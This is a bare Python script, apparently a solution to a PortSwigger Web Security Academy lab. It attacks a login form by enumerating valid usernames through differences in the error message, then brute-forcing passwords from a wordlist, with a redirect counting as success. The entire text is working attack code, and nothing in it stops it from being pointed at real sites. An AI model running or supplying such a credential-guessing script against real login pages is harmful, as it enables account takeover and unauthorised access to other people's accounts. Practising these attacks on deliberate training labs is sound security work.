import requests

url = 'https://0ae00079030a146481a52f1a009a00e5.web-security-academy.net/login'



users = [line.strip() for line in open("../users.txt", "r")]
passwords = [line.strip() for line in open("../pass.txt", "r")]
for user in users:
    payload = {"username" : user, "password" : "owo"}
    owo = requests.post(url, data=payload)
    if "Invalid username or password." not in owo.text:
        print(f"Found username {user}")
        for pwd in passwords:
            payload = {"username" : user, "password" : pwd}
            uwu = requests.post(url, data=payload, allow_redirects=False)
            if uwu.status_code in (300, 301, 302, 303, 307, 308):
                print(user + ":" + pwd)
                exit(0)
